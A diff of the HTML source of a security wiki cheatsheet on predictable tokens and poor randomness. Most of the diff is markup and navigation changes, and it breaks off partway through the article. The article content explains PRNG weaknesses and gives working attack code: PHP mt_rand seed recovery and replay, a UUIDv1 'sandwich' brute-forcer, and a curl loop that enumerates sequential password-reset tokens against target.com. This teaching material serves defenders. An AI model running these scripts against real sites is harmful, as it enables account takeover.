@@ -1,39 +1,60 @@
 <!DOCTYPE html>
-<html lang="en" dir="ltr">
+<html lang="en" dir="ltr" data-theme="light">
 <head>
-  <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta name="description" content="Token Predictability / Poor Randomness # Token Predictability occurs when applications generate security-sensitive tokens - session IDs, password reset links, CSRF tokens, API keys — using weak or non-cryptographic pseudo-random number generators (PRNGs). If the output is guessable, reproducible, or derivable from observable inputs (timestamps, IPs, sequential counters), an attacker can forge valid tokens without authentication.
-Root cause: using statistical PRNGs (rand(), mt_rand(), Math.random(), java.util.Random) where a CSPRNG is required.">
-<meta name="theme-color" content="#FFFFFF">
-<meta name="color-scheme" content="light dark"><meta property="og:title" content="Token Predictability / Poor Randomness" />
-<meta property="og:description" content="Token Predictability / Poor Randomness # Token Predictability occurs when applications generate security-sensitive tokens - session IDs, password reset links, CSRF tokens, API keys — using weak or non-cryptographic pseudo-random number generators (PRNGs). If the output is guessable, reproducible, or derivable from observable inputs (timestamps, IPs, sequential counters), an attacker can forge valid tokens without authentication.
-Root cause: using statistical PRNGs (rand(), mt_rand(), Math.random(), java.util.Random) where a CSPRNG is required." />
-<meta property="og:type" content="article" />
-<meta property="og:url" content="https://cyber-security.wiki/docs/application-security/web/Token-Predictability-Issues-Cheatsheet/" /><meta property="article:section" content="docs" />
-
-<meta property="article:modified_time" content="2026-08-05T21:53:05+05:30" />
-<title>Token Predictability / Poor Randomness | Cyber Security Wiki</title>
-<link rel="manifest" href="/manifest.json">
-<link rel="icon" href="/favicon.png" type="image/x-icon">
-<link rel="stylesheet" href="/book.min.565a95e2043493949e3fa72db3ec317e1e40f462858e732a1b18d1354e9c030c.css" integrity="sha256-VlqV4gQ0k5SeP6cts&#43;wxfh5A9GKFjnMqGxjRNU6cAww=" crossorigin="anonymous">
-  <script defer src="/flexsearch.min.js"></script>
-  <script defer src="/en.search.min.78166b9d46e23e0ea915cb6887a30b633e7bc4fad10c8b6b9f6fa532271c19ba.js" integrity="sha256-eBZrnUbiPg6pFctoh6MLYz57xPrRDItrn2&#43;lMiccGbo=" crossorigin="anonymous"></script>
-
-  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
-<!--
+  <!--
 Made with Book Theme
 https://github.com/alex-shpak/hugo-book
 -->
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Token Predictability / Poor Randomness# Token Predictability occurs when applications generate security-sensitive tokens - session IDs, password reset links, CSRF tokens, API keys — using weak or non-cryptographic pseudo-random number generators (PRNGs). If the output is guessable, reproducible, or derivable from observable inputs (timestamps, IPs, sequential counters), an attacker can forge valid tokens without authentication.
+Root cause: using statistical PRNGs (rand(), mt_rand(), Math.random(), java.util.Random) where a CSPRNG is required.
+Understanding the Basics# PRNG vs CSPRNG# Property Statistical PRNG CSPRNG Purpose Simulations, games, stats Cryptographic / security use Predictable from output Yes - seed recoverable No - computationally infeasible Secure for security tokens No Yes Recommended for tokens No Yes Examples (Weak / Strong) mt_rand(), rand(), Math.random(), java.util.Random random_bytes() (PHP), secrets (Python), crypto.randomBytes() (Node), SecureRandom (Java) Common Weak Seed Sources# Seeds derived from observable or low-entropy inputs make the entire PRNG output predictable:
+">
+<meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff">
+<meta name="theme-color" media="(prefers-color-scheme: dark)" content="#2e3440">
+<meta name="color-scheme" content="light dark"><meta property="og:url" content="https://cyber-security.wiki/docs/application-security/web/Token-Predictability-Issues-Cheatsheet/">
+	<meta property="og:site_name" content="Cyber Security Wiki">
+	<meta property="og:title" content="Token Predictability / Poor Randomness">
+	<meta property="og:description" content="Token Predictability / Poor Randomness# Token Predictability occurs when applications generate security-sensitive tokens - session IDs, password reset links, CSRF tokens, API keys — using weak or non-cryptographic pseudo-random number generators (PRNGs). If the output is guessable, reproducible, or derivable from observable inputs (timestamps, IPs, sequential counters), an attacker can forge valid tokens without authentication.
+Root cause: using statistical PRNGs (rand(), mt_rand(), Math.random(), java.util.Random) where a CSPRNG is required.
+Understanding the Basics# PRNG vs CSPRNG# Property Statistical PRNG CSPRNG Purpose Simulations, games, stats Cryptographic / security use Predictable from output Yes - seed recoverable No - computationally infeasible Secure for security tokens No Yes Recommended for tokens No Yes Examples (Weak / Strong) mt_rand(), rand(), Math.random(), java.util.Random random_bytes() (PHP), secrets (Python), crypto.randomBytes() (Node), SecureRandom (Java) Common Weak Seed Sources# Seeds derived from observable or low-entropy inputs make the entire PRNG output predictable:">
+	<meta property="og:locale" content="en">
+	<meta property="og:type" content="article">
+		<meta property="article:section" content="docs">
+		<meta property="article:modified_time" content="2026-08-05T21:53:05+05:30">
+
+
+	<meta itemprop="name" content="Token Predictability / Poor Randomness">
+	<meta itemprop="description" content="Token Predictability / Poor Randomness# Token Predictability occurs when applications generate security-sensitive tokens - session IDs, password reset links, CSRF tokens, API keys — using weak or non-cryptographic pseudo-random number generators (PRNGs). If the output is guessable, reproducible, or derivable from observable inputs (timestamps, IPs, sequential counters), an attacker can forge valid tokens without authentication.
+Root cause: using statistical PRNGs (rand(), mt_rand(), Math.random(), java.util.Random) where a CSPRNG is required.
+Understanding the Basics# PRNG vs CSPRNG# Property Statistical PRNG CSPRNG Purpose Simulations, games, stats Cryptographic / security use Predictable from output Yes - seed recoverable No - computationally infeasible Secure for security tokens No Yes Recommended for tokens No Yes Examples (Weak / Strong) mt_rand(), rand(), Math.random(), java.util.Random random_bytes() (PHP), secrets (Python), crypto.randomBytes() (Node), SecureRandom (Java) Common Weak Seed Sources# Seeds derived from observable or low-entropy inputs make the entire PRNG output predictable:">
+	<meta itemprop="dateModified" content="2026-08-05T21:53:05+05:30">
+	<meta itemprop="wordCount" content="2051">
+
+<title>Token Predictability / Poor Randomness • Cyber Security Wiki</title>
+<link rel="icon" href="/favicon.png" >
+<link rel="manifest" href="/manifest.json">
+<link rel="canonical" href="https://cyber-security.wiki/docs/application-security/web/Token-Predictability-Issues-Cheatsheet/">
+<link rel="stylesheet" href="/book.min.4d77e98d764f495b145946ef9260681bab38aaf7bc01f96a6f61a3a0fea19dbf.css" integrity="sha256-TXfpjXZPSVsUWUbvkmBoG6s4qve8Aflqb2GjoP6hnb8=" crossorigin="anonymous">
+
+
+
+  <script defer type="module" src="/en.search.min.07d8a67671a2c683431c7034b07b0f4b6c6daae7a9c289fde2e3663a9ff4e6c5.js" integrity="sha256-B9imdnGixoNDHHA0sHsPS2xtquepwon94uNmOp/05sU=" crossorigin="anonymous"></script>
+
+  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
+
   
 </head>
-<body dir="ltr">
+<body dir="ltr" class="book-kind-page book-type-docs">
   <input type="checkbox" class="hidden toggle" id="menu-control" />
   <input type="checkbox" class="hidden toggle" id="toc-control" />
   <main class="container flex">
-    <aside class="book-menu">
-      <div class="book-menu-content">
-        
+    
+<aside class="book-menu">
+  <div class="book-menu-content">
+    
   <nav>
 <h2 class="book-brand">
   <a class="flex align-center" href="/"><img src="/logo.png" alt="Logo" /><span>Cyber Security Wiki</span>
@@ -41,11 +62,15 @@ https://github.com/alex-shpak/hugo-book
 </h2>
 
 
-<div class="book-search">
-  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
+<div class="book-search hidden">
+  <input id="book-search-input" type="text" 
+    placeholder="Search"
+    aria-label="Search"
+    maxlength="64" />
   <div class="book-search-spinner hidden"></div>
   <ul id="book-search-results"></ul>
 </div>
+<script>document.querySelector(".book-search").classList.remove("hidden")</script>
 
 
 
@@ -56,9 +81,6 @@ https://github.com/alex-shpak/hugo-book
 
 
 
-
-
-  
 
 
 
@@ -73,8 +95,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-3478c05c39c328756601a040a5f9b7dc" class="toggle" checked />
-    <label for="section-3478c05c39c328756601a040a5f9b7dc" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-1f4bf90b10ddb9d04537ec779b672afa" class="toggle" checked />
+    <label for="section-1f4bf90b10ddb9d04537ec779b672afa" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Application Security</a>
     </label>
   
@@ -90,8 +112,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-3d187f458be5e96a9f7134b06fcbe171" class="toggle"  />
-    <label for="section-3d187f458be5e96a9f7134b06fcbe171" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-97ce584ed7ffb43a07e43ad9f5889c71" class="toggle"  />
+    <label for="section-97ce584ed7ffb43a07e43ad9f5889c71" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Thick Client</a>
     </label>
   
@@ -177,8 +199,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-0a8389ed2dba897f3cc2a5f45ae28a35" class="toggle"  />
-    <label for="section-0a8389ed2dba897f3cc2a5f45ae28a35" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-26c356cfc062017e944cd67af2378245" class="toggle"  />
+    <label for="section-26c356cfc062017e944cd67af2378245" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Vulnerable Applications</a>
     </label>
   
@@ -225,8 +247,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-305f8624390448e7b7dfdcd57bcf3063" class="toggle" checked />
-    <label for="section-305f8624390448e7b7dfdcd57bcf3063" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-db0925704b156fffd3db5c66cb42d41d" class="toggle" checked />
+    <label for="section-db0925704b156fffd3db5c66cb42d41d" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Web</a>
     </label>
   
@@ -980,8 +1002,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-eddb28de10b6358a7d90165be197c24d" class="toggle"  />
-    <label for="section-eddb28de10b6358a7d90165be197c24d" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-0d71dd2ccc73d3f39ad17c2db51c8573" class="toggle"  />
+    <label for="section-0d71dd2ccc73d3f39ad17c2db51c8573" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Cloud Security</a>
     </label>
   
@@ -1002,8 +1024,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-80f73357b2e3d82569ab2419d9c8fd53" class="toggle"  />
-    <label for="section-80f73357b2e3d82569ab2419d9c8fd53" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-5ef99b8721144773b97f7bfef900362b" class="toggle"  />
+    <label for="section-5ef99b8721144773b97f7bfef900362b" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">DevSecOps</a>
     </label>
   
@@ -1024,8 +1046,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-f8c2cedc89ecea36eb3aab749e9d9325" class="toggle"  />
-    <label for="section-f8c2cedc89ecea36eb3aab749e9d9325" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-a54fb62d899fdd9f3e0ff5a546ca08ec" class="toggle"  />
+    <label for="section-a54fb62d899fdd9f3e0ff5a546ca08ec" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Exploit Development</a>
     </label>
   
@@ -1046,8 +1068,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-ac63c4b6399921ce8f97ed202a2ebcb8" class="toggle"  />
-    <label for="section-ac63c4b6399921ce8f97ed202a2ebcb8" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-2aeefa6ddff0a8e5db97003607c446af" class="toggle"  />
+    <label for="section-2aeefa6ddff0a8e5db97003607c446af" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">IoT Security</a>
     </label>
   
@@ -1068,8 +1090,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-ff3f320cd65cf7b2cc2597d57706ff2e" class="toggle"  />
-    <label for="section-ff3f320cd65cf7b2cc2597d57706ff2e" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-150b068623f422b911e0c10751e41d4b" class="toggle"  />
+    <label for="section-150b068623f422b911e0c10751e41d4b" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Machine Learning</a>
     </label>
   
@@ -1103,8 +1125,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-3110560962cac834dcd3aead95e804a4" class="toggle"  />
-    <label for="section-3110560962cac834dcd3aead95e804a4" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-5d1d2284d8b625a6ff29beaf70c29606" class="toggle"  />
+    <label for="section-5d1d2284d8b625a6ff29beaf70c29606" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Network</a>
     </label>
   
@@ -1125,8 +1147,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-089d0b2a47920473e631158da2244e55" class="toggle"  />
-    <label for="section-089d0b2a47920473e631158da2244e55" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-5f3c3bc6686a139a7fd4ba11c67ca45b" class="toggle"  />
+    <label for="section-5f3c3bc6686a139a7fd4ba11c67ca45b" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Red Teaming</a>
     </label>
   
@@ -1147,8 +1169,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-b1f24361e619eb3af87e435a6f600cbe" class="toggle"  />
-    <label for="section-b1f24361e619eb3af87e435a6f600cbe" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-48d01542c459fd722a2e871cc9bbd985" class="toggle"  />
+    <label for="section-48d01542c459fd722a2e871cc9bbd985" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Threat Modelling</a>
     </label>
   
@@ -1169,35 +1191,13 @@ https://github.com/alex-shpak/hugo-book
 
 
 
-<hr>
-<b>
 
-
-  
-<ul>
-  
-  <li>
-    <a href="/contribute/" >
-        Contribute
-      </a>
-  </li>
-  
-  <li>
-    <a href="https://securecode.wiki" target="_blank" rel="noopener">
-        Secure Code Wiki by Payatu
-      </a>
-  </li>
-  
-</ul>
+<ul><li><a href="/contribute/" title="Contribute">contribute</a></li><li><a href="https://securecode.wiki" target="_blank" rel="noopener">Secure Code Wiki by Payatu</a></li></ul>
 
 
 
 
-
-
-</b>
 </nav>
-
 
 
 
@@ -1205,30 +1205,31 @@ https://github.com/alex-shpak/hugo-book
   <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
 
 
+
+  </div>
+</aside>
  
-      </div>
-    </aside>
 
     <div class="book-page">
-      <header class="book-header">
+      <header class="book-header hidden">
         
   <div class="flex align-center justify-between">
   <label for="menu-control">
-    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
+    <img src="/icons/menu.svg" class="book-icon" alt="Menu" />
   </label>
 
-  <strong>Token Predictability / Poor Randomness</strong>
+  <h3>Token Predictability / Poor Randomness</h3>
 
   <label for="toc-control">
     
-    <img src="/svg/toc.svg" class="book-icon" alt="Table of Contents" />
+    <img src="/icons/toc.svg" class="book-icon" alt="Table of Contents" />
     
   </label>
 </div>
 
 
   
-  <aside class="hidden clearfix">
+  <aside class="hidden">
     
   
 <nav id="TableOfContents">
@@ -1278,60 +1279,48 @@ https://github.com/alex-shpak/hugo-book
 
       
       
-  <article class="markdown"><h1 id="token-predictability--poor-randomness">
-  Token Predictability / Poor Randomness
-  <a class="anchor" href="#token-predictability--poor-randomness">#</a>
-</h1>
+  <article class="markdown book-article"><h1 id="token-predictability--poor-randomness">Token Predictability / Poor Randomness<a class="anchor" href="#token-predictability--poor-randomness">#</a></h1>
 <p>Token Predictability occurs when applications generate security-sensitive tokens - session IDs, password reset links, CSRF tokens, API keys — using weak or non-cryptographic pseudo-random number generators (PRNGs). If the output is guessable, reproducible, or derivable from observable inputs (timestamps, IPs, sequential counters), an attacker can forge valid tokens without authentication.</p>
 <p>Root cause: using statistical PRNGs (<code>rand()</code>, <code>mt_rand()</code>, <code>Math.random()</code>, <code>java.util.Random</code>) where a CSPRNG is required.</p>
-<h2 id="understanding-the-basics">
-  Understanding the Basics
-  <a class="anchor" href="#understanding-the-basics">#</a>
-</h2>
-<h3 id="prng-vs-csprng">
-  PRNG vs CSPRNG
-  <a class="anchor" href="#prng-vs-csprng">#</a>
-</h3>
+<h2 id="understanding-the-basics">Understanding the Basics<a class="anchor" href="#understanding-the-basics">#</a></h2>
+<h3 id="prng-vs-csprng">PRNG vs CSPRNG<a class="anchor" href="#prng-vs-csprng">#</a></h3>
 <table>
-<thead>
-<tr>
-<th>Property</th>
-<th>Statistical PRNG</th>
-<th>CSPRNG</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>Purpose</td>
-<td>Simulations, games, stats</td>
-<td>Cryptographic / security use</td>
-</tr>
-<tr>
-<td>Predictable from output</td>
-<td>Yes - seed recoverable</td>
-<td>No - computationally infeasible</td>
-</tr>
-<tr>
-<td>Secure for security tokens</td>
-<td>No</td>
-<td>Yes</td>
-</tr>
-<tr>
-<td>Recommended for tokens</td>
-<td>No</td>
-<td>Yes</td>
-</tr>
-<tr>
-<td>Examples (Weak / Strong)</td>
-<td><code>mt_rand()</code>, <code>rand()</code>, <code>Math.random()</code>, <code>java.util.Random</code></td>
-<td><code>random_bytes()</code> (PHP), <code>secrets</code> (Python), <code>crypto.randomBytes()</code> (Node), <code>SecureRandom</code> (Java)</td>
-</tr>
-</tbody>
+	<thead>
+			<tr>
+					<th>Property</th>
+					<th>Statistical PRNG</th>
+					<th>CSPRNG</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td>Purpose</td>
+					<td>Simulations, games, stats</td>
+					<td>Cryptographic / security use</td>
+			</tr>
+			<tr>
+					<td>Predictable from output</td>
+					<td>Yes - seed recoverable</td>
+					<td>No - computationally infeasible</td>
+			</tr>
+			<tr>
+					<td>Secure for security tokens</td>
+					<td>No</td>
+					<td>Yes</td>
+			</tr>
+			<tr>
+					<td>Recommended for tokens</td>
+					<td>No</td>
+					<td>Yes</td>
+			</tr>
+			<tr>
+					<td>Examples (Weak / Strong)</td>
+					<td><code>mt_rand()</code>, <code>rand()</code>, <code>Math.random()</code>, <code>java.util.Random</code></td>
+					<td><code>random_bytes()</code> (PHP), <code>secrets</code> (Python), <code>crypto.randomBytes()</code> (Node), <code>SecureRandom</code> (Java)</td>
+			</tr>
+	</tbody>
 </table>
-<h3 id="common-weak-seed-sources">
-  Common Weak Seed Sources
-  <a class="anchor" href="#common-weak-seed-sources">#</a>
-</h3>
+<h3 id="common-weak-seed-sources">Common Weak Seed Sources<a class="anchor" href="#common-weak-seed-sources">#</a></h3>
 <p>Seeds derived from observable or low-entropy inputs make the entire PRNG output predictable:</p>
 <ul>
 <li>Current timestamp (<code>time()</code>, <code>microtime()</code>, <code>Date.now()</code>)</li>
@@ -1341,10 +1330,7 @@ https://github.com/alex-shpak/hugo-book
 <li>Hardcoded / constant seed value</li>
 <li>UUID v1 (timestamp + MAC address — not random)</li>
 </ul>
-<h2 id="attack-surface">
-  Attack Surface
-  <a class="anchor" href="#attack-surface">#</a>
-</h2>
+<h2 id="attack-surface">Attack Surface<a class="anchor" href="#attack-surface">#</a></h2>
 <ul>
 <li><strong>Password Reset Links</strong> — Token generated per request; predictable token = account takeover</li>
 <li><strong>Session Tokens / Session IDs</strong> — Predictable session ID = session hijacking without login</li>
@@ -1355,42 +1341,30 @@ https://github.com/alex-shpak/hugo-book
 <li><strong>OTP / PIN Generation</strong> — Insufficient entropy in short numeric codes (4–6 digits)</li>
 <li><strong>Coupon / Voucher Codes</strong> — Sequential or low-entropy codes = mass redemption</li>
 </ul>
-<h2 id="exploiting-token-predictability">
-  Exploiting Token Predictability
-  <a class="anchor" href="#exploiting-token-predictability">#</a>
-</h2>
-<h3 id="1-timestamp-seeded-token-prediction-php-mt_rand">
-  1. Timestamp-Seeded Token Prediction (PHP mt_rand)
-  <a class="anchor" href="#1-timestamp-seeded-token-prediction-php-mt_rand">#</a>
-</h3>
+<h2 id="exploiting-token-predictability">Exploiting Token Predictability<a class="anchor" href="#exploiting-token-predictability">#</a></h2>
+<h3 id="1-timestamp-seeded-token-prediction-php-mt_rand">1. Timestamp-Seeded Token Prediction (PHP mt_rand)<a class="anchor" href="#1-timestamp-seeded-token-prediction-php-mt_rand">#</a></h3>
 <p>PHP&rsquo;s <code>mt_rand()</code> has only a <strong>32-bit seed</strong>, and if the app never seeds explicitly it&rsquo;s auto-seeded from system time <em>and</em> process ID (PHP ≥ 4.2.0). Because the seed space is just 2³², an attacker who captures a few <code>mt_rand()</code> outputs can brute-force the seed offline — <code>php_mt_seed</code> searches the full space in under a minute on a modern CPU — and then regenerate every token that process produces. <strong>Knowing the request time is not required.</strong> If the app explicitly calls <code>mt_srand(time())</code>, the search collapses to a small time window. (Stronger variant: the Lexfo technique recovers MT state from just 2 outputs with no brute-force at all.)</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Step 1 — Trigger a password reset for your own account, note the token and exact time</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Step 1 — Trigger a password reset for your own account, note the token and exact time</span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># Step 2 — Use php_mt_seed to recover the seed from a known mt_rand() output</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>php_mt_seed &lt;observed_token_value&gt;
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># Returns candidate seeds</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># Step 3 — Replay the PRNG from recovered seed to generate the victim&#39;s token</span>
-</span></span><span style="display:flex;"><span>php -r <span style="color:#e6db74">&#34;mt_srand(&lt;recovered_seed&gt;); echo mt_rand();&#34;</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># Brute force seed space using known approximate timestamp</span>
+</span></span><span style="display:flex;"><span>php -r <span style="color:#e6db74">&#34;mt_srand(&lt;recovered_seed&gt;); echo mt_rand();&#34;</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># Brute force seed space using known approximate timestamp</span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> subprocess<span style="color:#f92672">,</span> time
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>target_time <span style="color:#f92672">=</span> int(time<span style="color:#f92672">.</span>time())
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> seed <span style="color:#f92672">in</span> range(target_time <span style="color:#f92672">-</span> <span style="color:#ae81ff">2</span>, target_time <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>):  <span style="color:#75715e"># ±2 second window</span>
 </span></span><span style="display:flex;"><span>    output <span style="color:#f92672">=</span> subprocess<span style="color:#f92672">.</span>check_output([<span style="color:#e6db74">&#39;php&#39;</span>, <span style="color:#e6db74">&#39;-r&#39;</span>, <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;mt_srand(</span><span style="color:#e6db74">{</span>seed<span style="color:#e6db74">}</span><span style="color:#e6db74">); echo mt_rand();&#39;</span>])
 </span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Seed </span><span style="color:#e6db74">{</span>seed<span style="color:#e6db74">}</span><span style="color:#e6db74"> → </span><span style="color:#e6db74">{</span>output<span style="color:#f92672">.</span>decode()<span style="color:#f92672">.</span>strip()<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># Match output against observed token to confirm seed</span>
-</span></span></code></pre></div><h3 id="2-uuid-v1-sandwich-attack">
-  2. UUID v1 Sandwich Attack
-  <a class="anchor" href="#2-uuid-v1-sandwich-attack">#</a>
-</h3>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Match output against observed token to confirm seed</span></span></span></code></pre></div><h3 id="2-uuid-v1-sandwich-attack">2. UUID v1 Sandwich Attack<a class="anchor" href="#2-uuid-v1-sandwich-attack">#</a></h3>
 <p>UUIDv1 is built from a timestamp + MAC address — not random. An attacker brackets a victim&rsquo;s reset request between two of their own to narrow the token search space to a few thousand values.</p>
 <pre tabindex="0"><code>Attack flow:
 1. Trigger password reset for attacker account 1 → receive UUID token A
 2. Immediately trigger password reset for victim account
 3. Trigger password reset for attacker account 2 → receive UUID token B
-4. Victim&#39;s token lies between A and B — brute force the timestamp delta
-</code></pre><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> uuid<span style="color:#f92672">,</span> requests
+4. Victim&#39;s token lies between A and B — brute force the timestamp delta</code></pre><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> uuid<span style="color:#f92672">,</span> requests
 </span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> datetime <span style="color:#f92672">import</span> datetime, timedelta
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">generate_uuid1_range</span>(uuid_before, uuid_after):
@@ -1420,15 +1394,10 @@ https://github.com/alex-shpak/hugo-book
 </span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;https://target.com/reset?token=</span><span style="color:#e6db74">{</span>token<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;reset&#34;</span> <span style="color:#f92672">in</span> r<span style="color:#f92672">.</span>text<span style="color:#f92672">.</span>lower() <span style="color:#f92672">and</span> r<span style="color:#f92672">.</span>status_code <span style="color:#f92672">==</span> <span style="color:#ae81ff">200</span>:
 </span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[HIT] </span><span style="color:#e6db74">{</span>token<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>
-</span></span></code></pre></div><p>Identify UUID version from a token:</p>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span></span></span></code></pre></div><p>Identify UUID version from a token:</p>
 <pre tabindex="0"><code>xxxxxxxx-xxxx-[M]xxx-xxxx-xxxxxxxxxxxx
                 ^ M=1 → UUIDv1 (time-based, vulnerable)
-                  M=4 → UUIDv4 (random, safe)
-</code></pre><h3 id="3-sequential--incremental-token-enumeration">
-  3. Sequential / Incremental Token Enumeration
-  <a class="anchor" href="#3-sequential--incremental-token-enumeration">#</a>
-</h3>
+                  M=4 → UUIDv4 (random, safe)</code></pre><h3 id="3-sequential--incremental-token-enumeration">3. Sequential / Incremental Token Enumeration<a class="anchor" href="#3-sequential--incremental-token-enumeration">#</a></h3>
 <p>Tokens based on counters, auto-increment IDs, or simple patterns are enumerable directly.</p>
 <pre tabindex="0"><code>Observed tokens:
   reset_100042
@@ -1440,13 +1409,9 @@ https://github.com/alex-shpak/hugo-book
 for i in $(seq 100044 100200); do
   curl -s &#34;https://target.com/reset?token=reset_$i&#34; | grep -qi &#34;success&#34; \
     &amp;&amp; echo &#34;[HIT] reset_$i&#34;
-done
-</code></pre><h3 id="4-short-token--low-entropy-brute-force">
-  4. Short Token / Low Entropy Brute Force
-  <a class="anchor" href="#4-short-token--low-entropy-brute-force">#</a>
-</h3>
+done</code></pre><h3 id="4-short-token--low-entropy-brute-force">4. Short Token / Low Entropy Brute Force<a class="anchor" href="#4-short-token--low-entropy-brute-force">#</a></h3>
 <p>Tokens with insufficient length or character space are brute-forceable within a practical timeframe.</p>
